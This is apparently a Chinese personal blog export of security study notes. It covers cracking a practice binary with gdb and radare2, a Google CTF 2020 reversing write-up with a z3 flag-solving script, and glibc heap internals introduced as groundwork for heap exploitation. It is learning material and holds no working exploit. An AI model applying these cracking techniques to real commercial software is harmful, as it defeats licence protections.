<h6 id="用this调用全局变量，在EP和main-间，确定为构建"><a href="#用this调用全局变量，在EP和main-间，确定为构建" class="headerlink" title="用this调用全局变量，在EP和main()间，确定为构建"></a>用this调用全局变量，在EP和main()间，确定为构建</h6><p>1.2局部变量<br>指针指向未初始化的栈变量</p>
<h6 id="1-3动态分配变量-new-）"><a href="#1-3动态分配变量-new-）" class="headerlink" title="1.3动态分配变量 new(）"></a>1.3动态分配变量 new(）</h6><p>堆上分配</p>
<h5 id="2多态类识别"><a href="#2多态类识别" class="headerlink" title="2多态类识别"></a>2多态类识别</h5><h6 id="2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"><a href="#2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。" class="headerlink" title="2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"></a>2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。</h6><p>RTTICompleteObjectLocator pointer</p>
<hr>
<p>TypeDescriptor<br>指向的结构包含类名</p>
<hr>
<p>RTTIClassHierarchyDescriptor</p>
<hr>
<p>RTTIBaseClassDescriptor</p>
<hr>
<p>vftable<br>vbtable (virtual base class table)</p>
<hr>
<h3 id="指令E9"><a href="#指令E9" class="headerlink" title="指令E9 "></a>指令<code>E9 </code></h3><p>指令<code>E9 </code>相对寻址<br>e9 xxxxxxxx<br><code>xxxxxxxx=要跳转的地址-当前指令地址-当前指令长度（5）</code><br>e9 00 00 00 00  即跳转到下一个地址<br>402005-402000-5=000000</p>
<h3 id="指令EB"><a href="#指令EB" class="headerlink" title="指令EB"></a>指令<code>EB</code></h3><p><code>EB</code>表示short jmp命令，进行短距离跳转<br>eb xx</p>
<hr>
<h3 id="指令setne"><a href="#指令setne" class="headerlink" title="指令setne"></a>指令setne</h3><p><strong>set  if  not  equal</strong><br>setne cl<br>if ZF=1 then cl=0<br>if ZF=0 then cl=1</p>
<p>strings 命令<br>display printable strings in [file(s)] (stdin by default)</p>
<hr>
<h3 id="破解方法1"><a href="#破解方法1" class="headerlink" title="破解方法1"></a>破解方法1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ gdb ./ch25.bin </span><br><span class="line">(gdb) <span class="built_in">set</span> args toto <span class="comment">//设置输入参数toto</span></span><br><span class="line">(gdb) b main <span class="comment">//在main设置断点</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048a95</span> </span><br><span class="line">(gdb) r  <span class="comment">//运行程序（到断点）</span></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x08048a95</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span>disass <span class="comment">//显示汇编代码</span></span></span><br><span class="line">(gdb) b *main+268</span><br><span class="line">gdb)c 继续执行</span><br><span class="line">(gdb) layout prev 可以查看堆栈和汇编代码</span><br><span class="line">(gdb) x/<span class="number">1</span>xw $eax</span><br><span class="line">“ x / <span class="number">1</span>xw $ eax命令在EAX寄存器中包含的地址处显示<span class="number">1</span>个十六进制格式的<span class="number">16</span>位字</span><br><span class="line">(gdb) x/<span class="number">1</span>s <span class="number">0X08050b24</span></span><br><span class="line">查看该地址值</span><br></pre></td></tr></table></figure>

<h3 id="破解方法2"><a href="#破解方法2" class="headerlink" title="破解方法2"></a>破解方法2</h3><p><code>radare2 </code> 类似IDA</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">r2 ch25.bin</span><br><span class="line">aaa <span class="comment">//分析函数，参数...</span></span><br><span class="line">VV @main <span class="comment">//使用 VV 进入 图形化模式（需要是函数范围内）。</span></span><br><span class="line">pdf @ main <span class="comment">//分析后就可以正常打印函数代码了（pdf 打印函数代码）</span></span><br></pre></td></tr></table></figure>
<p>peda是GDB的一个插件<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
<p>gdb-peda$ run jlkd 带参数运行</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>essay1</title>
    <url>/2020/02/19/essay1/</url>
    <content><![CDATA[<p>matlab可以</p>
<p>psnr()  RGB图像直接来<br><img src="https://s2.ax1x.com/2020/02/19/3EM7nK.png" alt="3EM7nK.png"><br><img src="https://s2.ax1x.com/2020/02/19/3EMLAe.png" alt="3EMLAe.png"></p>
<p>Normalized  Cross  Correlation<br>normxcorr2 matlab计算方法不同<br><img src="https://s2.ax1x.com/2020/02/19/3EMXhd.png" alt="3EMXhd.png"><br>The  value  is  generally 0–1. However, ideally it should be 1 but the value 0.7 is acceptable.</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>google_ctf2020_RCE-beginner</title>
    <url>/2020/11/13/google_ctf2020_RCE-beginner/</url>
    <content><![CDATA[<h2 id="google-ctf"><a href="#google-ctf" class="headerlink" title="google_ctf"></a>google_ctf</h2><h3 id="RCE-beginner"><a href="#RCE-beginner" class="headerlink" title="RCE beginner"></a>RCE beginner</h3><p><strong>z3有用的链接：</strong></p>
<ul>
<li><a href="http://z3prover.github.io/api/html/namespacez3py.html#nested-classes" title="z3 API ">z3 API </a></li>
<li><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" title="z3 英语教程翻译">z3 英语教程翻译</a><br>（好多东西没说）<a id="more"></a>
</li>
</ul>
<hr>
<p>我想用z3来解决问题，但是不熟悉，很多操作不会，直接GG<br><a href="https://ctftime.org/writeup/23052" title="使用z3解决的wp">使用z3解决的wp</a> 我参考了这篇，熟悉了API（<code>Contact()</code>,<code>Extract()</code>,小学了下python，变量只用声明一个就行，我声明的太多了，后面的+，xor操作完全不成功。</p>
<pre><code>list(map(lambda i:flag[i], new_pshufb))

int.from_bytes(bytearray(new_xor), byteorder=&quot;big&quot;)将序列直接变成了整数</code></pre>
<hr>
<p>程序主要将输入进行三个操作：SHUFFLE, ADD32, XOR<br>最后进行条件判断<br><a href="https://imgchr.com/i/DprQNd"><img src="https://s3.ax1x.com/2020/11/13/DprQNd.jpg" alt="DprQNd.jpg"></a><br>这是数据在内存中的排列布局；<br><code>0x7fffffffddf0 </code>是输入值 <code>adcdefg12345678</code></p>
<hr>
<p>下面是参考的代码，注释部分是我写的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dword_from_bytes</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="comment"># Create a Z3 bit-vector concatenation expression.串联表达式。</span></span><br><span class="line">    <span class="keyword">return</span> Concat(b[<span class="number">3</span>],b[<span class="number">2</span>],b[<span class="number">1</span>],b[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap_endian</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="comment">#simplify(Extract(StringVal(&quot;abcd&quot;),2,1)) &quot;c&quot;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;从0计数，调整为位序，</span></span><br><span class="line"><span class="string">    最先ef be ad 现在是 ad be ef最后</span></span><br><span class="line"><span class="string">    76 58 b4 </span></span><br><span class="line"><span class="string">    extract(7,0) 就是将最后8位调前</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    b3 = Extract(<span class="number">31</span>, <span class="number">24</span>, b)</span><br><span class="line">    b2 = Extract(<span class="number">23</span>, <span class="number">16</span>, b)</span><br><span class="line">    b1 = Extract(<span class="number">15</span>, <span class="number">8</span>, b)</span><br><span class="line">    b0 = Extract(<span class="number">7</span>, <span class="number">0</span>, b)</span><br><span class="line">    <span class="keyword">return</span> Concat(b0, b1, b2, b3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;give me a bottle of rum!&quot;</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;dou kan cheng 128 bit&#x27;&#x27;&#x27;</span></span><br><span class="line">    flag = [BitVec(<span class="string">&#x27;c&#x27;</span>+<span class="built_in">str</span>(i), <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dest = []</span></span><br><span class="line">    pshufb = <span class="string">&#x27;000D0C0A08040F030E090B0501070602&#x27;</span></span><br><span class="line">    new_pshufb = []</span><br><span class="line">    <span class="comment"># new_dest = []</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pshufb), <span class="number">2</span>):</span><br><span class="line">        new_pshufb.append(<span class="built_in">int</span>(pshufb[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># new_pshufb.append(binascii.unhexlify(pshufb[i]+pshufb[i+1])[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    new_pshufb.reverse()</span><br><span class="line">    print(new_pshufb)</span><br><span class="line">    <span class="comment"># new_pshufb = [IntVal(i) for i in new_pshufb]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># dest = [Int(&#x27;flag%d&#x27; % i) for i in range(16)]</span></span><br><span class="line">    <span class="comment"># new_dest = [Int(&#x27;flag%d&#x27; % i) for i in range(16)]</span></span><br><span class="line">    <span class="comment"># pshufb  xmm0, xmmword [rel SHUFFLE]</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;for i in range(16):</span></span><br><span class="line"><span class="string">    if 0x80 == new_pshufb[i] &amp; 0x80:</span></span><br><span class="line"><span class="string">            And</span></span><br><span class="line"><span class="string">            new_dest[i] = &#x27;00&#x27;</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">    new_dest[i] = (dest[new_pshufb[i].as_long() % 16])&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># python3 由于map()返回一个迭代器，因此我们使用了list()函数立即生成结果</span></span><br><span class="line">    output=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i:flag[i], new_pshufb))</span><br><span class="line"></span><br><span class="line">    p3 = dword_from_bytes(output[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    p2 = dword_from_bytes(output[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    p1 = dword_from_bytes(output[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">    p0 = dword_from_bytes(output[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># paddd   xmm0, xmmword [rel ADD32]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;add32 = &#x27;6763746613371337FEE1DEADDEADBEEF&#x27;</span></span><br><span class="line"><span class="string">    new_add32 = []</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for i in range(0, len(add32), 2):</span></span><br><span class="line"><span class="string">        new_add32.append(int(add32[i:i+2], 16))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    new_add32.reverse()</span></span><br><span class="line"><span class="string">    new_add32 = [IntVal(i) for i in new_add32]</span></span><br><span class="line"><span class="string">    for i in range(4):</span></span><br><span class="line"><span class="string">    x=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    y=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for j in range(4):</span></span><br><span class="line"><span class="string">    x.join(format(new_add32[i*4+j].as_long(),&#x27;x&#x27;))</span></span><br><span class="line"><span class="string">    y.join(format(new_dest[i*4+j],&#x27;x&#x27;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    tmp=(BitVec(new_add32[i*4:i*4+4],32)+BitVec(new_add32[i*4:i*4+4],32))&amp;BitVec(0xffffffffff,32)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#定义上只有32位，所以不考虑进位</span></span><br><span class="line">    p3 = (p3 + <span class="number">0xdeadbeef</span>)</span><br><span class="line">    p2 = (p2 + <span class="number">0xfee1dead</span>)</span><br><span class="line">    p1 = (p1 + <span class="number">0x13371337</span>)</span><br><span class="line">    p0 = (p0 + <span class="number">0x67637466</span>) </span><br><span class="line"></span><br><span class="line">    output = Concat(swap_endian(p3), </span><br><span class="line">                    swap_endian(p2), </span><br><span class="line">                    swap_endian(p1), </span><br><span class="line">                    swap_endian(p0))</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;tmp = (int(x, 16) +</span></span><br><span class="line"><span class="string">    int(y, 16)) &amp; 0xffffffff</span></span><br><span class="line"><span class="string">    tmp = format(tmp, &#x27;x&#x27;)</span></span><br><span class="line"><span class="string">    new4_dest = []</span></span><br><span class="line"><span class="string">    for j in range(0, len(tmp), 2):</span></span><br><span class="line"><span class="string">    new4_dest.append(int(tmp[j:j+2],16))</span></span><br><span class="line"><span class="string">    new_dest[i*4:i*4+4] = new4_dest&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    xor = <span class="string">&#x27;AAF986EB34F823D4385F1A8D49B45876&#x27;</span></span><br><span class="line">    new_xor = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(xor), <span class="number">2</span>):</span><br><span class="line">        new_xor.append(<span class="built_in">int</span>(xor[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    new_xor.reverse()</span><br><span class="line">    <span class="comment">#new_xor = [IntVal(i) for i in new_xor]</span></span><br><span class="line">    <span class="comment"># pxor    xmm0, xmmword [rel XOR]</span></span><br><span class="line">    xor_val = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytearray</span>(new_xor), byteorder=<span class="string">&quot;big&quot;</span>)<span class="comment">#big 表示大端序 即末尾放在高地址处 即顺序保持不变</span></span><br><span class="line">    output = output ^ xor_val</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;final_dest = [Int(&#x27;flag%d&#x27; % i) for i in range(16)]</span></span><br><span class="line"><span class="string">    for (i, j) in zip(new_dest, new_xor):</span></span><br><span class="line"><span class="string">    final_dest.append(format(i ^ j, &#x27;x&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#solver.add(final_dest == dest)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        high = ((<span class="number">16</span> - i) * <span class="number">8</span>) - <span class="number">1</span> </span><br><span class="line">        low = ((<span class="number">16</span> - i) * <span class="number">8</span>) - <span class="number">8</span></span><br><span class="line">        solver.add(flag[i] == Extract(high, low, output))    </span><br><span class="line">        <span class="comment">#最高位127~120 ， 表示第一个字节</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ctf = &#x27;CTF&#123;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(4):</span></span><br><span class="line"><span class="string">    solver.add(chr(int(final_dest[i])) == ctf[i])&#x27;&#x27;&#x27;</span></span><br><span class="line">    solver.add(flag[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    solver.add(flag[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">    solver.add(flag[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line">    solver.add(flag[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        m = solver.model()</span><br><span class="line">        <span class="comment">#s = []</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;for i in range(16):</span></span><br><span class="line"><span class="string">            s.append(m[dest[i]].as_long())&#x27;&#x27;&#x27;</span></span><br><span class="line">        print(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: m[x].as_long(), flag)).decode())</span><br><span class="line">        print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>成功！<br><a href="https://imgchr.com/i/Dprsg0"><img src="https://s3.ax1x.com/2020/11/13/Dprsg0.jpg" alt="Dprsg0.jpg"></a></p>
<hr>
<p>还有用angr的，但我在机子上试了下都不成功</p>
<ul>
<li><a href="https://github.com/Dvd848/CTFs/blob/master/2020_GoogleCTF/Beginner.md" title="方法1">方法1</a></li>
<li><a href="https://gist.github.com/CreateRemoteThread/53d53b0b4a10346dabb9392231b81955" title="方法2">方法2</a></li>
<li><a href="https://www.youtube.com/watch?v=RCgEIBfnTEI" title="视频">视频</a></li>
</ul>
]]></content>
      <categories>
        <category>google_ctf</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>heap入门</title>
    <url>/2021/03/04/heap%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="堆利用Heap-Exploitation"><a href="#堆利用Heap-Exploitation" class="headerlink" title="堆利用Heap Exploitation"></a>堆利用Heap Exploitation</h1><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a><br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/">https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/</a></p>
<p>基础知识学习ptmalloc</p>
<h2 id="命令：："><a href="#命令：：" class="headerlink" title="命令：："></a>命令：：</h2><p><code>gef➤  x/32gx &amp;main_arena </code><br><code>gef➤  heap bins </code></p>
<a id="more"></a>
<h2 id="申请与释放"><a href="#申请与释放" class="headerlink" title="申请与释放"></a>申请与释放</h2><p>malloc()<br>free()</p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc() 使用<code>brk() mmap()</code>申请内存</p>
<h4 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk() sbrk()"></a>brk() sbrk()</h4><p>The<code>program break</code>is the<code>address</code>of the first location beyond the current end of the data region.</p>
<pre><code>#include &lt;unistd.h&gt;

int brk(void* end_data_segment);
void *sbrk(intptr_t increment);


┌─[zentreisender@parrotos]─[~/Documents/heap]
└──╼ $./brk
Welcome to sbrk example:178107
Program Break Location1:0x555db6660000
a
Program break Location2:0x555db6661000
Program Break Location3:0x555db6660000
a</code></pre>
<p>代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>brk 参数是指针，设置break值<br>所以先用sbrk(0)获得当前break值的指向指针<br>再设置brk(sbrk(0)+4096)</p>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h4><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p>
<pre><code>addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></pre>
<p>munmap()</p>
<pre><code>char* addr
addr = (char*) malloc(1000);</code></pre>
<p>虽然只是申请了1000个字节，但是我们却得到了0x0806c000-0x0804b000=0x21000个字节的堆，int(0x21000,10)/1024=132，原来这132KB的堆空间叫做<code>arena</code>，此时因为是主线程分配的，所以这个区域叫做 <code>main arena</code>，（称这一块连续的内存区域为 arena，）申请的内存会一直从这个 arena 中获取，直到空间不足，当 arena 空间不足时，它可以通过增加<code>brk</code>的方式来增加堆的空间。</p>
<p>this shows heap memory is created by increasing program break location ( ie) using brk syscall</p>
<h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>Allocated memory region (of size 1000 bytes) is <code>released only to ‘glibc malloc’ library</code>,‘glibc malloc’ doesnt get new heap memory from kernel, instead it will try to find a free block in bin. And only when no free block exists, it obtains memory from kernel.</p>
<p>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</p>
<p>看出实际真的分配给程序的内存为1M(b7500000-b7600000)。heap memory of size 1 MB ,而且，只有132KB的部分具有可读可写权限，这一块连续的区域成为<code>thread arena</code>。是使用<code>mmap()</code>分配的，而不是sbrk()<br>当用户请求的内存大于128KB时，并且没有任何arena有足够的空间时，那么系统就会执行mmap函数来分配相应的内存空间，而不是sbrk()。这与这个请求来自于主线程还是从线程无关。</p>
<p> Instead allocated memory region (of size 1000 bytes) is released to ‘glibc malloc’, which adds this freed block to its thread arenas bin.</p>
<h2 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h2><pre><code>gef➤  x/32gx $rax-0x10
0x555555559290:    0x0000000000000000    0x0000000000000021
0x5555555592a0:    0x0000000000000000    0x0000000000000000
0x5555555592b0:    0x0000000000000000    0x0000000000020d51
0x5555555592c0:    0x0000000000000000    0x0000000000000000
0x5555555592d0:    0x0000000000000000    0x0000000000000000
0x5555555592e0:    0x0000000000000000    0x0000000000000000
0x5555555592f0:    0x0000000000000000    0x0000000000000000
0x555555559300:    0x0000000000000000    0x0000000000000000
0x555555559310:    0x0000000000000000    0x0000000000000000
0x555555559320:    0x0000000000000000    0x0000000000000000</code></pre>
<p>presize 8字节<br>size 8字节<br>0x5555555592a0 开始是user-data<br>64位最小分配16B，32位最小分配8B，所以是<code>16+8+8+1=21</code><br>user-data+header-len+pre_(1)=21<br><code>size最低三位，LSB表示前一chunk是否分配。</code></p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>结尾于arena的最高地址处<br>堆地址从低地址向高地址增长<br><a href="https://imgtu.com/i/6Vae81"><img src="https://s3.ax1x.com/2021/03/04/6Vae81.png" alt="6Vae81.png"></a></p>
<p>在程序在向堆管理器申请内存时，没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</p>
<p>chunk()</p>
<h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>prev_size: If the <code>previous chunk is free</code>, this field contains <code>the size of previous chunk</code>. Else if previous chunk is <code>allocated</code>, this field contains<code> previous chunk’s user data</code>.<br>size: This field contains the size of this allocated chunk. <code>Last 3 bits</code> of this field contains flag information.</p>
<pre><code>PREV_INUSE (P) – This bit is set when previous chunk is allocated.
IS_MMAPPED (M) – This bit is set when chunk is mmap’d.
NON_MAIN_ARENA (N) – This bit is set when this chunk belongs to a thread arena.</code></pre>
<p>Other fields of malloc_chunk (like fd, bk) <code>is NOT used for allocated chunk</code>. Hence in place of these fields user data is stored.<br>·由于存储malloc_chunk以及对齐目的需要一些额外的空间，因此用户请求的大小将转换为可用大小（内部表示大小）。<br>·转换的方式是不会设置可用大小的最后3位，因此将其用于存储标志信息。<br><a href="https://imgtu.com/i/6VaHR1"><img src="https://s3.ax1x.com/2021/03/04/6VaHR1.png" alt="6VaHR1.png"></a></p>
<h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><p>prev_size: <code>No two free chunks can be adjacent together</code>. When both the chunks are free, its <code>gets combined into one single free chunk</code>. Hence always previous chunk to this freed chunk would be allocated and therefore prev_size contains previous chunk’s user data.<br><code>fd</code>: Forward pointer – Points to <code>next chunk</code> in the same bin (and NOT to the next chunk present in physical memory).<br>bk: Backward pointer – Points to previous chunk in the same bin (and NOT to the previous chunk present in physical memory).<br><a href="https://imgtu.com/i/6VaOsK"><img src="https://s3.ax1x.com/2021/03/04/6VaOsK.png" alt="6VaOsK.png"></a></p>
<h2 id="bins-垃圾桶"><a href="#bins-垃圾桶" class="headerlink" title="bins 垃圾桶"></a>bins 垃圾桶</h2><p>已经申请到的内存空间大小进行释放，来决定放入哪类 bins 当中去。<br>Fast bin<br>Unsorted bin<br>Small bin<br>Large bin</p>
<h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>64位下<br><code>Chunks of size 0x20 to 0x80 bytes is called a fast chunk.</code><br>其中的0x10字节是用来存prev_size和size</p>
<p>Number of bins – 10<br>Each fast bin contains a <code>single linked list</code> (a.k.a binlist) of free chunks.<br>Fast bins contain a binlist of chunks whose sizes are 8 bytes apart. ie) First fast bin (index 0) contains binlist of chunks of size 16 bytes, second fast bin (index 1) contains binlist of chunks of size  24 bytes and so on…</p>
<p>During malloc initialization, maximum fast bin size is set to 64 (!80) bytes.</p>
<h3 id="small-and-large-bins"><a href="#small-and-large-bins" class="headerlink" title="small and large bins"></a>small and large bins</h3><p>When small or large chunk gets freed instead of adding them in to their respective bins, <code>its gets added into unsorted bin.</code> 重要<br>This approach gives ‘glibc malloc’ a second chance to reuse the recently freed chunks.<br>Chunk size – There is no size restriction, chunks of any size belongs to this bin.</p>
<h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><pre><code>────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)
Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)
Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)</code></pre>
<p><code>a chunk of size 0x20-0x2f would fit into idx 0</code>, a chunk of size<code> 0x30-0x3f would fit into idx 1</code>, and so on and so forth.</p>
<p>有七条链表，每个链表有一个头，后面接着free的块<br>链表后进先出，使用头插法</p>
<h3 id="tcachebins"><a href="#tcachebins" class="headerlink" title="tcachebins"></a>tcachebins</h3><p>在glibc2.26中引入<br>一个链条同一时间只能有7个块<br>可以有64条链条<br>size任意0x20-0x410<br>当size不大（这个程度后面讲）堆块free后，不会直接进入各种bin，而是进入tcache，如果下次需要该大小内存，直接讲tcache分配出去<br>多出的块到达fastbins，（在大小符合的情况下）<br><a href="https://www.freebuf.com/articles/system/234219.html">https://www.freebuf.com/articles/system/234219.html</a><br><a href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p>
<p>tcachebins就相当于fastbins 而且较少检查</p>
<h3 id="Unsorted-Large-and-Small-Bins"><a href="#Unsorted-Large-and-Small-Bins" class="headerlink" title="Unsorted, Large and Small Bins"></a>Unsorted, Large and Small Bins</h3><p>双向链表<br>头部都在同一数组中，有不同的索引值。<br>0x00:         Not Used<br>0x01:         Unsorted Bin<br>0x02 - 0x3f:  Small Bin<br>0x40 - 0x7e:  Large Bin</p>
<p>Unsorted Bin只有一条链， 62 for the Small Bin, and 63 for the Large Bin</p>
